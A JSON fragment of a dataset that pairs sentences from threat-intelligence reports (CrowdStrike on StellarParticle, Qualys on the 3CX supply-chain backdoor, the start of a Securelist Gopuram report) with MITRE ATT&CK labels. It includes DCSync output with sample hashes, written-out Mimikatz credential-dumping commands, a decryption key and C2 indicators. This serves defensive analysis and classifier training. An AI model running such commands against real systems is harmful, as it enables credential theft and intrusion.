            "A common name for this particular technique is DCSync.11 An example output from Get-AdReplAccount is below: DistinguishedName: CN=TestUser,OU=Admins,OU=Users,DC=demo,DC=local Sid: S-1-5-21-1432446722-301123485-1266542393-2012 Guid: 12321930-7c05-4011-8a3e-e0b9b6e04567 SamAccountName: TestUser SamAccountType: User UserPrincipalName: TestUser@demo.local PrimaryGroupId: 513 SidHistory: Enabled: True UserAccountControl:",
            "NormalAccount AdminCount: True Deleted: False LastLogonDate: 12/2/2021 1:41:46 PM DisplayName: TestUser GivenName: Test Surname: User Description: Admin Account ServicePrincipalName: SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited, DiscretionaryAclProtected, SelfRelative Owner: S-1-5-21-1432446722-301123485-1266542393-512 Secrets NTHash: 84a058676bb6d7de4237e18f09b91156 LMHash: NTHashHistory: Hash 01: 84a058676bb6d7de4237e18f09b91156 Hash 02: e047ebb3b7c463928c928fca95ac0ac8 Hash 03: 6dc3cdb3e559ef00d3521351ace7477e Hash 04: a88355849f35fe7336de23a4ca3e6a9e Hash 05: de9bde95677672295349aa6e1e857704 LMHashHistory: ",
            "Hash 01: 12227358dd7013c7dbdbd8fdcc0c6668 Hash 02: 6a028636a6f52491424586bb88357f7c Hash 03: c13ef7347853dc3be7e7259fdc8818a1 Hash 04: 6635151746869ce485246037747adae1 Hash 05: 85543f498b007e07a3da662c8a9d450b SupplementalCredentials: ClearText: ",
            "NTLMStrongHash: de164e3465f163e846a5e1c22a5ac649 Kerberos: Credentials: DES_CBC_MD5 Key: 0013364f00003915 DES_CBC_CRC Key: 0013364f00003915 OldCredentials: DES_CBC_MD5 Key: 00002a46000004bc DES_CBC_CRC Key: 00002a46000004bc Salt: demo.localTestUser Flags: 0 KerberosNew: Credentials: AES256_CTS_HMAC_SHA1_96 Key: afd4d60e8d0920bc2f94d551f62f0ea2a17523bf2ff8ffb0fdade2a90389282f Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: f67c2bcbfcfa30fccb36f72dca22a817 Iterations: 4096 DES_CBC_MD5 Key: 00002f34000004ee Iterations: 4096 DES_CBC_CRC Key: 00002f34000004ee Iterations: 4096 OldCredentials: AES256_CTS_HMAC_SHA1_96 Key: b430783ab4c957cf6a03d3d348af27264c0d872932650ffca712d9ebcf778b9f Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: dc34bfd5e469edbeada77fac56aa35ae Iterations: 4096 DES_CBC_MD5 Key: 0000345400000520 Iterations: 4096 DES_CBC_CRC Key: 0000345400000520 Iterations: 4096 OlderCredentials: AES256_CTS_HMAC_SHA1_96 Key: 26efd3593712e555f8366bb4b8aff097d09acd93c3a1b6d4ea03c578aad9e087 Iterations:",
            "4096 AES128_CTS_HMAC_SHA1_96 Key: c38dfbd6c00b5f3b010a07f9e824fc38 Iterations: 4096 DES_CBC_MD5 Key: 000039a500000551 Iterations: 4096 DES_CBC_CRC Key: 000039a500000551 Iterations: 4096 ServiceCredentials: Salt:",
            "demo.localTestUser DefaultIterationCount: 4096 Flags: 0 WDigest: Hash 01: 83ed141ab0eaf1ff7694147ba97e1994 Hash 02: e73a8c05d4a7df53774bfa7ef8f0f574 Hash 03: 0c228c5816a79e561d999d489499a12a Hash 04: 83ed141ab0eaf1ff7694147ba97e1994 Hash 05: e73a8c05d4a7df53774bfa7ef8f0f574 Hash 06: 4e7c5ec6ffb6100f0c7f0bc57749bc93 Hash 07: 83ed141ab0eaf1ff7694147ba97e1994 Hash 08: 10265b08a3bb710da516832eaf64368a Hash 09: 10265b08a3bb710da516832eaf64368a Key Credentials: Credential Roaming Created: Modified: Credentials: Figure 10.",
            "Get-ADReplAccount example output When executing the Get-ADReplAccount command, the threat actor specified the AD context to be targeted via the NamingContext parameter.",
            "This was necessary, as the threat actor was targeting multiple domains.",
            "The resulting output of each command was redirected to a text file and compressed as zip archives before exfiltration. ",
            "The fact that Get-ADReplAccount command includes not only the current NTLM hashes but also the hash history (i.e., hashes of previous passwords used by a user account) meant that the threat actor also had the ability to discover accounts that either reused the same passwords or used similar passwords when the account password was changed. ",
            "Credential Refresh On some investigations, the dwell time of the threat actor spanned years.",
            "Given this extended period, it is logical to assume that some credentials obtained by the threat actor would be rotated during normal business operations.",
            "To combat this, the threat actor periodically \u201crefreshed\u201d their credential set by performing credential theft activities in an already compromised environment.",
            "At one victim, CrowdStrike identified multiple instances of domain credential theft months apart, each time with a different credential theft technique. ",
            "One of the credential theft techniques identified by CrowdStrike was the use of a PowerShell script to execute Mimikatz in-memory.",
            "While in-memory Mimikatz is not particularly unique, the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.",
            "CrowdStrike was able to reconstruct the PowerShell script from the PowerShell Operational event log as the script\u2019s execution was logged automatically due to the use of specific keywords.",
            "CrowdStrike recommends that organizations upgrade PowerShell on their systems, as this functionality is only available with PowerShell version 5 and above. ",
            "In addition to refreshing the threat actor\u2019s credentials, the threat actor would also refresh their understanding of the victim\u2019s AD environment.",
            "Around the time when the threat actor executed Get-ADReplAccount, the threat actor also executed a renamed version of AdFind to output domain reconnaissance information.",
            "In this instance, AdFind was renamed to masquerade as a legitimate Windows binary.",
            "The usage of renamed AdFind is consistent with other industry reporting on this campaign. ",
            "In addition to using scripted commands, operators were repeatedly observed manually executing several standard PowerShell cmdlets to enumerate network information from AD, including Get-ADUser and Get-ADGroupMember to query specific members in the directory.",
            "This information provided the adversary with a list of accounts possessing particular privileges \u2014 in this case, the ability to make VPN connections \u2014 that would be subject to later credential stealing attempts and leveraged to access the victim at a later time. ",
            "Password Policies/Hygiene ",
            "In some cases, the threat actor was able to quickly return to the environment and essentially pick up where they left off, even though the organization had performed an enterprise-wide password reset, including a reset of all service accounts and the double-reset of the krbtgt account.",
            "CrowdStrike determined that in these cases, administrative users had \u201creset\u201d their own password to the same password they previously used, essentially nullifying the impact of the enterprise-wide reset.",
            "This was possible even though the customer\u2019s Active Directory was configured to require new passwords to be different from the previous five passwords for a given account.",
            "Unfortunately, this check only applies when a user is changing their password via the \u201cpassword change\u201d method \u2014 but if a \u201cpassword reset\u201d is performed (changing the password without knowing the previous password), this check is bypassed for an administrative user or a Windows account that has the Reset Password permission on a user\u2019s account object.12 Since the Get-ADReplAccount cmdlet described above included the NTHashHistory values (i.e., previous password hashes) for user accounts, CrowdStrike was able to verify that some administrative accounts indeed had the exact same password hash showing up multiple times in the password history, as well as in the current NTHash value. ",
            "Close Out The StellarParticle campaign, associated with the COZY BEAR adversary group, demonstrates this threat actor\u2019s extensive knowledge of Windows and Linux operating systems, Microsoft Azure, O365, and Active Directory, and their patience and covert skill set to stay undetected for months \u2014 and in some cases, years. ",
            "A special thank you to the CrowdStrike Incident Response and CrowdStrike Intelligence teams for helping make this blog possible, especially Ryan McCombs, Ian Barton, Patrick Bennet, Alex Parsons, Christopher Romano, Jackson Roussin and Tom Goldsmith. ",
            "Endnotes https://us-cert.cisa.gov/sites/default/files/publications/CISA_Fact_Sheet-Russian_SVR_Activities_Related_to_SolarWinds_Compromise_508C.pdf https://docs.microsoft.com/en-us/partner-center/permissions-overview https://docs.microsoft.com/en-us/partner-center/announcements/2021-december#9 https://attack.mitre.org/techniques/T1546/003/ CrowdStrike Premium Intelligence Report https://attack.mitre.org/techniques/T1213/001/ https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/ https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/block-legacy-authentication https://docs.microsoft.com/en-us/exchange/applicationimpersonation-role-exchange-2013-help https://github.com/MichaelGrafnetter/DSInternals https://attack.mitre.org/techniques/T1003/006/ https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/bbee5135-3db2-4824-873a-55104c3610ad MITRE ATT&CK Framework The following table maps TTPs covered in this article to the MITRE ATT&CK:registered: framework. ",
            "Tactic Technique Observable Credential Access T1003.006 OS Credential Dumping: DCSync The threat actor obtained Active Directory credentials through domain replication protocols using the Get-ADReplAccount command from DSInternals Credential Access T1003.001: OS Credential Dumping: LSASS Memory The threat actor used a heavily obfuscated PowerShell script to execute the Mimikatz commands \u2018privilege::debug sekurlsa::logonpasswords \u201clsadump::lsa /patch\u201d\u2018 in-memory and encrypt the output Initial Access / Persistence T1078.003: Valid Accounts: Local Accounts A local account was used by the Threat Actor to establish a SSH tunnel into the internal network environment Initial Access / Persistence T1133:",
            "External Remote Services The threat actor used VPNs to gain access to systems and persist in the environment Credential Access T1555.003: Credentials from Password Stores: Credentials from Web Browsers The threat actor exported saved passwords from user\u2019s Chrome browser installations Credential Access T1539:",
            "Steal Web Session Cookie The threat actor stole web session cookies from end user workstations and used them to access cloud resources Lateral Movement T1021.001:",
            "Remote Services:",
            "Remote Desktop Protocol The threat actor used both privileged and non-privileged accounts for RDP throughout the environment, depending on the target system Initial Access, Persistence T1078.004: Valid Accounts: Cloud Accounts The threat actor used accounts with Delegated Administrator rights to access other O365 tenants.",
            "The Threat actor also used valid accounts to create persistence within the environment. ",
            "Persistence T1546.003: Event Triggered Execution: Windows Management Instrumentation Event Subscription TrailBlazer was configured to execute after a reboot via a command-line event consumer Defense Evasion T1036.005:",
            "Masquerading: Match Legitimate Name or Location The threat actor renamed their utilities to masquerade as legitimate system binaries (AdFind as svchost.exe), match the system\u2019s role (GoldMax), or appear legitimate (TrailBlazer as an apparent Adobe utility).",
            "Additionally, the threat actor renamed their systems prior to connecting to victim\u2019s VPNs to match the victim\u2019s system naming convention Discovery T1087.002: Account Discovery: Domain Account T1482: Domain Trust Discovery T1069.002: Permission Groups Discovery: Domain Groups The threat actor used AdFind, standard PowerShell cmdlets, and custom tooling to identify various pieces of information from Active Directory Defense Evasion / Lateral Movement T1550.001:",
            "Use Alternate Authentication Material: Application Access Token The threat actor used compromised service principals to make changes to the Office 365 environment. ",
            "Collection T1213.:",
            "Data from Information Repositories: The threat actor accessed data from Information Repositories Persistence T1098.001:",
            "Account Manipulation:",
            "Additional Cloud Credentials The threat actor added credentials to O365 Service Principals Persistence T1078.004: Valid Accounts: Cloud Accounts The threat actor created new O365 Service Principals to maintain access to victim\u2019s environments Discovery T1057: Process Discovery The threat actor regularly interrogated other systems using tasklist.exe Reconnaissance T1595.001:",
            "Active Scanning: Scanning IP Blocks The threat actor probed external services in an attempt to regain access to the environment Indicators of Compromise (IOCs) Indicator Details http://satkas.waw[.]pl/rainloop/forecast TrailBlazer C2 1326932d63485e299ba8e03bfcd23057f7897c3ae0d26ed1235c4fb108adb105 TrailBlazer SHA256 vm-srv-1.gel.ulaval.ca GoldMax C2 2a3b660e19b56dad92ba45dd164d300e9bd9c3b17736004878f45ee23a0177ac GoldMax SHA256 156.96.46.116 TA Infrastructure 188.34.185.85 TA Infrastructure 212.103.61.74 TA Infrastructure 192.154.224.126 TA Infrastructure 23.29.115.180 TA Infrastructure 104.237.218.74 TA Infrastructure 23.82.128.144 TA Infrastructure Additional Resources Read about the latest trends in threat hunting and more in the 2021 Threat Hunting Report or simply download the report now. Learn more about Falcon OverWatch proactive managed threat hunting. ",
            "Watch this video to see how Falcon OverWatch proactively hunts for threats in your environment. ",
            "Learn more about the CrowdStrike Falcon:registered: platform by visiting the product webpage. ",
            "Test CrowdStrike next-gen AV for yourself.",
            "Start your free trial of Falcon Prevent today. "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1078"
            ],
            [
                "T1078"
            ],
            [],
            [],
            [
                "T1078"
            ],
            [],
            [],
            [
                "T1021.001",
                "T1078"
            ],
            [
                "T1021.001",
                "T1078"
            ],
            [
                "T1078"
            ],
            [],
            [],
            [],
            [
                "T1078"
            ],
            [],
            [],
            [
                "T1078"
            ],
            [
                "T1570",
                "T1078"
            ],
            [],
            [
                "T1140"
            ],
            [
                "T1140"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1140",
                "T1021.001"
            ],
            [],
            [
                "T1021.001"
            ],
            [],
            [],
            [],
            [
                "T1070.004"
            ],
            [],
            [
                "T1078"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1078"
            ],
            [
                "T1078"
            ],
            [],
            [
                "T1071.001",
                "T1047",
                "T1036.005"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1047"
            ],
            [
                "T1036.005"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1564.001",
                "T1036.005"
            ],
            [],
            [],
            [],
            [],
            [
                "T1083"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1021.001",
                "T1078"
            ],
            [
                "T1078"
            ],
            [],
            [],
            [],
            [
                "T1021.001"
            ],
            [
                "T1078"
            ],
            [],
            [
                "T1021.001",
                "T1078"
            ],
            [],
            [
                "T1033"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1078"
            ],
            [
                "T1078"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1078"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1057"
            ],
            [
                "T1047"
            ],
            [
                "T1057"
            ],
            [],
            [
                "T1057"
            ],
            [
                "T1057"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1078"
            ],
            [
                "T1078"
            ],
            [
                "T1078"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1078"
            ],
            [
                "T1570",
                "T1021.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1003.001"
            ],
            [
                "T1027"
            ],
            [],
            [],
            [],
            [],
            [
                "T1036.005"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1027",
                "T1003.001",
                "T1078"
            ],
            [],
            [],
            [],
            [
                "T1021.001",
                "T1078"
            ],
            [
                "T1078"
            ],
            [],
            [
                "T1036.005"
            ],
            [
                "T1036.005"
            ],
            [],
            [],
            [],
            [],
            [
                "T1057",
                "T1078"
            ],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "3CXDesktopApp Backdoored in a Suspected Lazarus Campaign\u00a0\u00a0",
        "cti_report": [
            "title: 3CXDesktopApp Backdoored in a Suspected Lazarus Campaign url: https://blog.qualys.com/vulnerabilities-threat-research/2023/04/03/3cxdesktopapp-backdoored-in-a-suspected-lazarus-campaign Introduction The attack involved a compromised version of the 3CX VoIP desktop client, which was used to target 3CX\u2019s customers.",
            "The compromised 3CX application is a private automatic branch exchange (PABX) software and is available for Windows, macOS, Linux, Android, IOS and Chrome.",
            "Currently, there are reports of attacks for both Windows and macOS. ",
            "The Qualys Threat Research Unit (TRU) is tracking a supply chain compromise in a popular VOIP desktop client by 3CX that is attributed to DPRK nation-state adversaries.",
            "The attack was reported in late March 2023 and is an ongoing investigation. ",
            "Executive Summary The North Korean state-sponsored group Labyrinth Chollima have been identified as the perpetrators behind the supply chain compromise of 3CXDesktopApp beta 18.12.407 and final 18.12.416 applications.",
            "The affected applications are signed and have valid signatures. ",
            "The adversary infrastructure on GitHub used for staging the attack has now been taken down.",
            "This means that newer infections will not occur.",
            "However, the attack\u2019s potential impact was significant, as the software is widely used by businesses around the world. ",
            "To mitigate the risk, affected users are recommended to immediately uninstall the application and perform a full system scan to detect and remove any associated malware. ",
            "This threat is being tracked as by MITRE as CVE-2023-29059 Fig.1 Campaign flow Technical Summary Once the affected version of 3CX is installed or updated, it drops a compromised ffmpeg.dll as well as d3dcompiler_47.dll, which contains embedded shellcode.",
            "When 3CXDesktopApp starts, it sideloads the compromised ffmpeg.dll, which in turn decodes the embedded shellcode from d3dcompiler_47.dll and loads it.",
            "The shellcode accesses a GitHub repository and brings down icon files which contain encrypted C2 strings that the shellcode then decrypts and communicates to.",
            "The adversary has also deployed a previously unseen info stealer in the later stages of the attack and we have provided an analysis for it in later sections.",
            "This info stealer gathers system information and browser data from Chrome, Edge, Brave, and Firefox.",
            "This info stealer was likely meant to identify interesting targets for the operators. ",
            "Existing customers of Qualys can follow the steps in the Detection and Protection sections to identify potential impacts.",
            "We also recommended that customers implement robust security measures, such as regular vulnerability assessments, patch management regular auditing of vendors. ",
            "Overall, this supply chain attack highlights the importance of ensuring the security and integrity of the supply chain, as well as the need for businesses to remain vigilant and proactive in their security measures. ",
            "Operating SystemHashFilename Windows aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868 3cxdesktopapp-18.12.407.msi Windows 59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983 3cxdesktopapp-18.12.416.msi macOS 5407cda7d3a75e7b1e030b1f33337a56f293578ffa8b3ae19c671051ed314290 3CXDesktopApp-18.11.1213.dmg macOS e6bbc33815b9f20b0cf832d7401dd893fbc467c800728b5891336706da0dbcec 3cxdesktopapp-latest.dmg Table.1 Details of the affected Applications Technical Analysis of Infection Stages First Stage Analysis ",
            "The original MSI file which initiated the infection drops three files \u201c3CXDesktopApp.exe\u201d, \u201cffmpeg.dll\u201d, and \u201cd3dcompiler_47.dll\u201d.",
            "3CXDesktopApp.exe is the legitimate VOIP desktop application and is abused for side loading \u201cffmpeg.dll\u201d. ",
            "File Type MD5 SHA256 DLL PE 64bits ffmpeg.dll 27B134AF30F4A86F177DB2F2555FE01D C485674EE63EC8D4E8FDE9800788175A8B02D3F9416D0E763360FFF7F8EB4E02 DLL PE 64bits D3dcompiler_47.dll 82187AD3F0C6C225E2FBA0C867280CC9 11BE1803E2E307B647A8A7E02D128335C448FF741BF06BF52B332E0BBF423B03 Table.2 Initial dropped samples Once \u201cffmpeg.dll\u201d is loaded, it tries to enumerate the current directory for the second DLL \u201cd3dcompiler_47.dll\u201d.",
            "Once found, the \u201cffmpeg.dll\u201d loads the second DLL into memory. ",
            "Fig.2 ffmpeg enumerating current directory ",
            "The \u201cd3dcompiler_47.dll\u201d DLL has an encrypted payload embedded in it.",
            "ffmpeg.dll tries to identify this payload using the signature \u201c0xCEFAEDFE\u201d. ",
            "Fig.3 Embedded encrypted payload ",
            "After the identification of the encrypted payload.",
            "\u201cffmpeg.dll\u201d will try to decrypt it using the RC4 encryption scheme with the key \u201c3jB(2bsG#@c7\u201d. ",
            "Fig.4 RC4 decryption The decrypted payload is shown below.",
            "Also, a call to VirtualProtect() is made to give the PAGE_EXECUTE_READWRITE permissions for the payload to be executed. ",
            "Fig.5 Decrypted payload The decrypted payload that is going to be executed contains another embedded DLL as shown below.",
            "The DLL is dumped from memory to perform more investigations on it. ",
            "Fig.6 Dll loading by encrypted payload Second Stage Analysis The embedded DLL will mainly try to fetch malicious \u201cico\u201d files from the GitHub Repository \u201chttps://raw[.]githubusercontent[.]com/IconStorages/images/main/icon%d[.]ico\u201d.",
            "The repository contains multiple icon files that have Base64 and AES encrypted C2\u2019s appended to them.",
            "The full list of decoded C2\u2019s is listed in the IOC section.",
            "This repository has already been taken down. ",
            "Qualys TRU detected an info stealer involved in the infection chain and considers it as a later-stage payload. ",
            "Fig.",
            "7 GitHub repository Info Stealer Analysis File Type MD5 SHA256 SignatureCompilation TimeDLL PE 64bits 7FAEA2B01796B80D180399040BB69835 8AB3A5EAAF8C296080FADF56B265194681D7DA5DA7C02562953A4CB60E147423 N/A Fri Mar 17 00:32:58 2023 Table.4 Info stealer details The info stealer was deployed in the later stages of the infection chain and is a previously unseen sample.",
            "Its capabilities are mainly gathering system and browser information, including Chrome, Edge, Firefox, and Brave Browsers. ",
            "Fig.8 Browser DB location The info stealer uses queries to fetch browsers history and data for Edge, SQLite database history for chrome and \u201cPlaces\u201d Table for Firefox. ",
            "Fig.9 SQL queries for collection The info stealer also collects information on infected hosts, such as domain name, Hostname and OS Version, using NetWkstaGetInfo() API.",
            "Following locations are accessed by the information stealer: Google Chrome \u2013 AppData\\Local\\Google\\Chrome\\User Data Microsoft Edge \u2013 AppData\\Local\\Microsoft\\Edge\\User Data Brave Browser \u2013 AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data Mozilla Firefox \u2013 AppData\\Roaming\\Mozilla\\Firefox\\Profiles Fig.10 System data collection -1 Fig.10 System data collection -2 Qualys Detection & Protection ",
            "The first step in assessing the risk of this attack to an organization is understanding if this software is in use.",
            "Users of the Qualys Cyber Security Asset Management can quickly identify all installed software across their organization.",
            "For example, within seconds, you can use the below query to identify assets with instances of the 3CX Desktop Application. software:(name:\u201d3CX Desktop App 18.12\u2033) ",
            "Fig.12 CSAM Software Search Qualys VMDR also has QID 378327 ready to detect assets which have the vulnerable version of the 3CXDesktopApp.exe file present on their machines.",
            "Qualys Vulnerability Management Detection and Response (VMDR) users can scan their environment with this QID to quickly detect impacted systems.",
            "Example output: Fig.13",
            "VMDR QID 378327 details Alternatively, another option is to gather data from endpoints to hunt for the existence of the impacted software.",
            "Two such open-source scripts are available on GitHub.",
            "The 3cxIngectionHunter script will simply crawl the filesystem looking for instances of the infected ffmpeg.dll file and report back if there is a match to the malicious hash.",
            "The 3CXLocalDNSCacheHunter script will collect the local DNS cache and look for a match against some of the known URLs associated with this campaign.",
            "Using Qualys Custom Asset and Remediation, you can utilize the following PowerShell community scripts to identify potential infected assets by either copying the contents of the script manually or pointing the tool to the GitHub script directly to download. ",
            "Fig.14 CAR Scripts Users of Custom Assessment and Remediation and Qualys Patch Management can also push scripts to uninstall the impacted software automatically.",
            "These scripts will be published to GitHub in the coming days. ",
            "An example output from a system that does not have a vulnerable version of ffmpeg.dll installed: Fig.15 CAR script output CAR can also be leveraged to remediate this vulnerability.",
            "You need to execute this uninstallation script provided by Qualys.",
            "This script checks for 3CX Desktop App\u2019s vulnerable version 18.12.407.0 & 18.12.416.0 for Windows.",
            "If any of these versions are installed on the system, the script will attempt to uninstall the vulnerable application. ",
            "Fig.16 CAR script for remediation You can also create dashboards for better visualization. ",
            "Fig.17 CAR dashboard for 3CX Qualys Multi-Vector EDR customers are protected against this threat as both the installer and the beacon are detected and will be remediated.",
            "(Note: our instance was set to audit-only mode for analysis.) ",
            "Fig.18 EPP Scan Results Fig.19 Epp Detection for shellcode loader Multi-Vector EDR customers can also hunt through telemetry, looking for behavior indicators to identify this threat activity.",
            "A first step would look for instances where the 3cxdesktopapp.exe process executed in the environment using a QQL Query of process.name:\u201d3xcdesktopapp.exe\u201d.",
            "Here you would want to look for evidence of the ffmpeg.dll file being loaded, which would be indicative that this machine may be impacted by this campaign. ",
            "Fig.20 EDR Behavioral Detection Telemetry Fig.21 EDR Shellcode Loader Detection Fig.22 Loaded malicious ffmpeg.dll telemetry While Qualys Endpoint Protection (EPP) users will be automatically protected by default, Qualys EDR-only customers can use the recently released auto-remediation feature to automatically take action. ",
            "Conclusion Supply chain compromises are a growing concern for businesses, as they can lead to serious security breaches and financial losses.",
            "The attack was a multi-stage chain where attackers compromised a version of the 3CX VoIP desktop client, which was then used to target the company\u2019s customers.",
            "This is reminiscent of the SolarWinds campaign that we examined back in December 2022. ",
            "Organizations should take immediate steps to stop using the vulnerable version of the software, apply patches and monitor for anomalous behavior in 3CX processes.",
            "It is also essential to enable behavioral monitoring to detect the presence of such attacks within the system. ",
            "MITRE TID Mapping TacticTechnique IDTechnique Name Resource Development T1608.001 Stage Capabilities: Upload Malware Resource Development T1587.003 Develop Capabilities: Digital Certificates Initial Access T1195.002 Supply Chain Compromise: Compromise Software Supply Chain Execution T1106 Native API Execution T1204.002 ",
            "User Execution: Malicious File Defense Evasion T1140 Deobfuscate/Decode Files or Information Defense Evasion T1027 Obfuscated Files or Information Defense Evasion T1574.002 Hijack Execution Flow: DLL Side-Loading Defense Evasion T1553.002 Subvert Trust Controls: Code Signing Defense Evasion T1497.003 Virtualization/Sandbox Evasion: Time-Based Evasion Credential Access T1555 Credentials from Password Stores Credential Access T1539 Steal Web Session Cookie Command and Control T1132.001 Data Encoding: Standard Encoding Command and Control T1102.001 Web Service:",
            "Dead Drop Resolver Command and Control T1071 Application Layer Protocol Collection T1005 Data from Local System Table.5 MITRE mapping IOCS ffmpeg.dll C485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02 7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896 c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02 d3dcompiler.dll 11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03 11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03 Embedded dll F86A81B89C5FD4C98BC8616440FF0382505EC7942DA6D4F19EEE011E956434A8 Trojanized 3cxDesktopApp Dde03348075512796241389dfea5560c20a3d2a2eac95c894e7bbed5e85a0acc Fad482ded2e25ce9e1dd3d3ecc3227af714bdfbbde04347dbc1b21d6a3670405 92005051ae314d61074ed94a52e76b1c3e21e7f0e8c1d1fdd497a006ce45fa61 ",
            "B86c695822013483fa4e2dfdf712c5ee777d7b99cbad8c2fa2274b133481eadb ",
            "Infostealer dll Cad1120d91b812acafef7175f949dd1b09c6c21a 7faea2b01796b80d180399040bb69835 GitHub Repository raw[.]githubusercontent[.]com/IconStorages/images/main/ C2s akamaicontainer[.]com akamaitechcloudservices[.]com azuredeploystore[.]com azureonlinecloud[.]com azureonlinestorage[.]com dunamistrd[.]com glcloudservice[.]com journalide[.]org msedgepackageinfo[.]com msstorageazure[.]com msstorageboxes[.]com officeaddons[.]com officestoragebox[.]com pbxcloudeservices[.]com pbxphonenetwork[.]com pbxsources[.]com qwepoi123098[.]com sbmsa[.]wiki sourceslabs[.]com visualstudiofactory[.]com zacharryblogs[.]com Icon File Hashes a541e5fc421c358e0a2b07bf4771e897fb5a617998aa4876e0e1baa5fbb8e25c d459aa0a63140ccc647e9026bfd1fccd4c310c262a88896c57bbe3b6456bd090 d51a790d187439ce030cf763237e992e9196e9aa41797a94956681b6279d1b9a 4e08e4ffc699e0a1de4a5225a0b4920933fbb9cf123cde33e1674fde6d61444f 8c0b7d90f14c55d4f1d0f17e0242efd78fd4ed0c344ac6469611ec72defa6b2d f47c883f59a4802514c57680de3f41f690871e26f250c6e890651ba71027e4d3 2c9957ea04d033d68b769f333a48e228c32bcf26bd98e51310efd48e80c1789f 268d4e399dbbb42ee1cd64d0da72c57214ac987efbb509c46cc57ea6b214beca c62dce8a77d777774e059cf1720d77c47b97d97c3b0cf43ade5d96bf724639bd c13d49ed325dec9551906bafb6de9ec947e5ff936e7e40877feb2ba4bb176396 f1bf4078141d7ccb4f82e3f4f1c3571ee6dd79b5335eb0e0464f877e6e6e3182 2487b4e3c950d56fb15316245b3c51fbd70717838f6f82f32db2efcc4d9da6de e059c8c8b01d6f3af32257fc2b6fe188d5f4359c308b3684b1e0db2071c3425c d0f1984b4fe896d0024533510ce22d71e05b20bad74d53fae158dc752a65782e Contributors Travis Smith, Vice President, Threat Research Unit, Qualys Irfan Asrar, Director, Malware and Threat Research, Qualys Mayuresh Dani, Manager, Threat Research.",
            "Qualys Sabri Naoufal, Senior Malware Analyst, Qualys Mohammad Shabbir, Malware Analyst, Qualys Akshat Pradhan, Senior Engineer, Threat Research, Qualys "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1140"
            ],
            [
                "T1027",
                "T1140"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1574.002"
            ],
            [
                "T1083"
            ],
            [],
            [
                "T1083"
            ],
            [
                "T1027"
            ],
            [],
            [
                "T1027"
            ],
            [
                "T1027"
            ],
            [
                "T1140"
            ],
            [
                "T1140"
            ],
            [],
            [
                "T1140"
            ],
            [],
            [
                "T1027"
            ],
            [
                "T1573.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1106",
                "T1005",
                "T1082"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1083"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "Not just an infostealer Gopuram backdoor deployed through 3CX supply chain attack",
        "cti_report": [
            "title: Not just an infostealer: Gopuram backdoor deployed through 3CX supply chain attack url: https://securelist.com/gopuram-backdoor-deployed-through-3cx-supply-chain-attack/109344/ On March 29, Crowdstrike published a report about a supply chain attack conducted via 3CXDesktopApp, a popular VoIP program.",
            "Since then, the security community has started analyzing the attack and sharing their findings.",
            "The following has been discovered so far: ",
            "The infection is spread via 3CXDesktopApp MSI installers.",
            "An installer for macOS has also been trojanized. ",
            "The malicious installation package contains an infected dll library that decrypts a shellcode from the d3dcompiler_47.dll library\u2019s overlay and executes it. ",
            "The decrypted payload extracts C2 server URLs from icons stored in a GitHub repository (the repository is removed). ",
            "The payload connects to one of the C2 servers, downloads an infostealer and starts it. ",
            "The infostealer collects system information and browser history, then sends it to the C2 server. ",
            "As we reviewed available reports on the 3CX attack, we began wondering if the compromise concluded with the infostealer or further implants followed.",
            "To answer that question, we decided to review the telemetry we had on the campaign.",
